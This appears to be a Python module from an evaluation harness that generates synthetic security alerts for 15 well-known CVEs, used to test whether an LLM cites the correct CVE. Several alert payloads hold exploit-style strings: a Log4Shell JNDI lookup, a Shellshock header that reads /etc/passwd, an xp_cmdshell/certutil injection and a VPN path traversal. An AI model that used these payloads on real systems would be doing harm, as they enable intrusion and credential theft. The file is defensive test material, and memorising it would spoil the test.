"""
experiments/evaluation/soc_integration/cve_pool.py

Secure_SOC_AI's rule engine has no `cve` field at all (checked directly
against secure_soc_ai.models.Alert) — its 7 rules are behavioral detections
(login patterns, process patterns, network patterns), none of which map to
a specific CVE. So the rule-engine-derived incidents in synthetic_events.jsonl
will never carry real CVE content, and the CVE-grounding checker has nothing
to exercise against them.

This is a separate, larger pool of real, NVD-verifiable CVEs, built the same
way experiments/evaluation/cve_bait_alerts.py already does (that file stays
untouched — it's a small, deliberately adversarial n=6 set with its own
methodology). This pool is for realistic-scale, non-adversarial coverage of
CVE grounding, mirroring the rule-engine incidents' role on the MITRE side.

Two styles per CVE, each with 2 victim-entity variants:
  - "bait":   describes the exploit's behavior/signature without naming the
              CVE number (same idea as cve_bait_alerts.py) — tests whether
              the LLM spontaneously cites the correct real CVE, an
              irrelevant real one, or a fabricated one.
  - "stated": the CVE ID is stated directly in the alert, as a vulnerability
              scanner or EDR product would report it — tests whether the
              grounding check correctly handles a citation that's already
              present and accurate.

`ground_truth_cve` records the real CVE each entry is modeled on, for later
precision/recall analysis (see INTEGRATION_PLAN.md phase 7).
"""

from src.agent.alert_schema import SecurityAlert

# (cve, name, port, protocol, bait_description, bait_payload, stated_description_template)
_CVES = [
    (
        "CVE-2021-44228", "Log4Shell", 443, "TCP",
        "JNDI lookup string detected in application log fields, consistent with "
        "exploitation of a widely publicized Java logging library remote code "
        "execution vulnerability from December 2021.",
        "${{jndi:ldap://{dest_ip}/a}}",
        "Vulnerability scanner flagged outbound JNDI/LDAP callback matching "
        "{cve} (Log4Shell) exploitation in application server logs.",
    ),
    (
        "CVE-2017-5638", "Apache Struts2 OGNL RCE", 8080, "TCP",
        "Apache Struts 2 server observed processing a crafted Content-Type header "
        "resulting in remote command execution. Payload matches known OGNL "
        "injection technique used in high-profile breaches.",
        "Content-Type: %{{(#_='multipart/form-data')...}} OGNL expression detected",
        "WAF blocked a request exploiting {cve} (Apache Struts2 Jakarta Multipart "
        "OGNL remote code execution) against the public-facing app server.",
    ),
    (
        "CVE-2014-0160", "Heartbleed", 443, "TCP",
        "OpenSSL heartbeat extension observed returning excess memory content "
        "beyond the requested payload length, consistent with a well-known 2014 "
        "buffer over-read vulnerability in TLS heartbeat handling.",
        "heartbeat request length mismatch: requested 65535, payload actual 18",
        "TLS inspection appliance detected an oversized heartbeat response "
        "consistent with {cve} (Heartbleed) memory disclosure.",
    ),
    (
        "CVE-2021-34473", "ProxyShell (Exchange SSRF chain)", 443, "TCP",
        "Exchange server exhibiting proxy-based authentication bypass followed "
        "by webshell drop, matching a well-known 2021 exploit chain targeting "
        "on-premises Exchange deployments.",
        "POST /autodiscover/autodiscover.json?@evil.com/... HTTP/1.1",
        "EDR correlated an Exchange autodiscover SSRF request with a dropped "
        "webshell, matching {cve} (ProxyShell) exploitation.",
    ),
    (
        "CVE-2016-5195", "Dirty COW", None, None,
        "Linux host showing signs of local privilege escalation via a race "
        "condition in a copy-on-write memory handling routine, consistent with "
        "a well-publicized kernel vulnerability nicknamed after a 'cow'.",
        "ptrace(PTRACE_POKETEXT) called on /proc/self/mem by unprivileged uid=1001",
        "Kernel audit log flagged a race-condition write to /proc/self/mem "
        "consistent with {cve} (Dirty COW) privilege escalation.",
    ),
    (
        "CVE-2017-0144", "EternalBlue", 445, "TCP",
        "SMBv1 server processing a crafted trans2 request with an anomalous "
        "field size, consistent with a leaked NSA exploit used in several "
        "large-scale worm outbreaks.",
        "SMB1 TRANS2_QUERY_PATH_INFORMATION: FID field overflow detected",
        "IDS signature match: SMBv1 exploit attempt consistent with {cve} "
        "(EternalBlue) against unpatched host.",
    ),
    (
        "CVE-2014-6271", "Shellshock", 80, "TCP",
        "Web server CGI handler passed an environment variable containing a "
        "function definition followed by extra shell commands, consistent with "
        "a widely exploited Bash parsing vulnerability from 2014.",
        'User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"',
        "WAF blocked a CGI request exploiting {cve} (Shellshock) Bash "
        "environment variable parsing.",
    ),
    (
        "CVE-2021-34527", "PrintNightmare", 445, "TCP",
        "Windows Print Spooler service observed loading an unsigned driver "
        "from a remote share immediately after a RpcAddPrinterDriver call, "
        "consistent with a 2021 spooler remote code execution/privesc bug.",
        "RpcAddPrinterDriverEx call from unprivileged session, driver path \\\\{dest_ip}\\share\\evil.dll",
        "EDR flagged Print Spooler loading an unsigned remote driver, matching "
        "{cve} (PrintNightmare).",
    ),
    (
        "CVE-2022-22965", "Spring4Shell", 8080, "TCP",
        "Spring MVC application observed processing a crafted class-loader "
        "parameter in a form-bound request, consistent with a 2022 remote code "
        "execution vulnerability in the Spring Framework.",
        "class.module.classLoader.resourceableFactory.constructor... parameter binding detected",
        "Application firewall blocked a class-loader manipulation request "
        "matching {cve} (Spring4Shell).",
    ),
    (
        "CVE-2023-4966", "Citrix Bleed", 443, "TCP",
        "Citrix NetScaler Gateway observed leaking session token data via an "
        "oversized HTTP request to a management endpoint, consistent with a "
        "2023 session-hijacking information disclosure vulnerability.",
        "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1 (oversized Host header)",
        "NetScaler appliance logs show session token leakage consistent with "
        "{cve} (Citrix Bleed) exploitation.",
    ),
    (
        "CVE-2023-34362", "MOVEit Transfer SQLi/RCE chain", 443, "TCP",
        "MOVEit Transfer web application processing a crafted SQL payload "
        "against a public endpoint, followed by webshell deployment, matching "
        "a 2023 mass-exploitation campaign against managed file transfer software.",
        "POST /guestaccess.aspx body='; EXEC xp_cmdshell('certutil -urlcache...')--",
        "File integrity monitoring detected a webshell drop following SQLi "
        "consistent with {cve} (MOVEit Transfer) exploitation.",
    ),
    (
        "CVE-2021-26855", "ProxyLogon", 443, "TCP",
        "Exchange server processing an inbound request with a forged Cookie "
        "header used to bypass authentication and reach internal endpoints, "
        "consistent with a 2021 server-side request forgery vulnerability.",
        "Cookie: X-AnonResource=true; X-AnonResource-Backend=<internal-fqdn>",
        "EDR correlated an Exchange SSRF authentication bypass matching {cve} "
        "(ProxyLogon).",
    ),
    (
        "CVE-2019-0708", "BlueKeep", 3389, "TCP",
        "RDP server processing a crafted virtual channel request during "
        "pre-authentication, consistent with a wormable 2019 remote code "
        "execution vulnerability in Remote Desktop Services.",
        "MS_T120 channel bound outside its normal allocation during RDP handshake",
        "IDS signature match: RDP pre-auth exploit attempt consistent with "
        "{cve} (BlueKeep).",
    ),
    (
        "CVE-2020-1472", "Zerologon", 445, "TCP",
        "Domain controller processing a Netlogon authentication request with "
        "an all-zero client challenge, consistent with a 2020 privilege "
        "escalation vulnerability allowing domain admin takeover.",
        "NetrServerAuthenticate3: 8-byte zero client challenge from workstation account",
        "Domain controller security log flagged a Netlogon authentication "
        "bypass matching {cve} (Zerologon).",
    ),
    (
        "CVE-2018-13379", "Fortinet SSL VPN path traversal", 443, "TCP",
        "SSL VPN portal processing a crafted URL containing directory "
        "traversal sequences targeting the session file store, consistent "
        "with a 2018-disclosed credential-harvesting vulnerability.",
        "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        "VPN gateway logs show a path-traversal request against the session "
        "store matching {cve} (Fortinet SSL VPN).",
    ),
]

VICTIM_HOSTS = [
    ("10.0.5.20", "10.0.5.21"), ("10.0.6.30", "10.0.6.31"),
    ("10.0.7.40", "10.0.7.41"), ("10.0.8.50", "10.0.8.51"),
    ("10.0.9.60", "10.0.9.61"), ("10.0.10.70", "10.0.10.71"),
    ("10.0.11.80", "10.0.11.81"), ("10.0.12.90", "10.0.12.91"),
    ("10.0.13.100", "10.0.13.101"), ("10.0.14.110", "10.0.14.111"),
    ("10.0.15.120", "10.0.15.121"), ("10.0.16.130", "10.0.16.131"),
    ("10.0.17.140", "10.0.17.141"), ("10.0.18.150", "10.0.18.151"),
    ("10.0.19.160", "10.0.19.161"),
]
ATTACKER_HOSTS = [
    "203.0.113.201", "203.0.113.202", "203.0.113.203", "203.0.113.204",
    "203.0.113.205", "203.0.113.206", "203.0.113.207", "203.0.113.208",
    "203.0.113.209", "203.0.113.210", "203.0.113.211", "203.0.113.212",
    "203.0.113.213", "203.0.113.214", "203.0.113.215", "203.0.113.216",
    "203.0.113.217", "203.0.113.218", "203.0.113.219", "203.0.113.220",
    "203.0.113.221", "203.0.113.222", "203.0.113.223", "203.0.113.224",
    "203.0.113.225", "203.0.113.226", "203.0.113.227", "203.0.113.228",
    "203.0.113.229", "203.0.113.230",
]

CVE_POOL_ALERTS: list[dict] = []
_addr_i = 0
_alert_n = 0

for cve, name, port, protocol, bait_desc, bait_payload, stated_tmpl in _CVES:
    for style in ("bait", "stated"):
        for variant in range(2):
            dest_ip, victim_internal = VICTIM_HOSTS[_addr_i % len(VICTIM_HOSTS)]
            src_ip = ATTACKER_HOSTS[_addr_i % len(ATTACKER_HOSTS)]
            _addr_i += 1
            _alert_n += 1
            alert_id = f"CVEPOOL-{_alert_n:03d}"

            if style == "bait":
                description = bait_desc
                payload = bait_payload.format(dest_ip=dest_ip) if "{dest_ip}" in bait_payload else bait_payload
            else:
                description = stated_tmpl.format(cve=cve)
                payload = (bait_payload.format(dest_ip=dest_ip) if "{dest_ip}" in bait_payload else bait_payload) \
                    + f" [{cve}]"

            alert = SecurityAlert(
                alert_id=alert_id,
                timestamp=f"2026-08-08T{9 + (_alert_n % 8):02d}:{(_alert_n * 7) % 60:02d}:00",
                severity="CRITICAL" if style == "stated" or _alert_n % 3 == 0 else "HIGH",
                source_ip=src_ip,
                destination_ip=victim_internal,
                event_type=name.upper().replace(" ", "_").replace("(", "").replace(")", "").replace("/", "_"),
                description=description,
                protocol=protocol,
                port=port,
                payload_snippet=payload,
            )
            CVE_POOL_ALERTS.append({
                "alert": alert,
                "ground_truth_cve": cve,
                "cve_name": name,
                "style": style,
            })

if __name__ == "__main__":
    print(f"{len(CVE_POOL_ALERTS)} CVE-pool alerts across {len(_CVES)} real CVEs "
          f"({len(_CVES)} x 2 styles x 2 variants)")
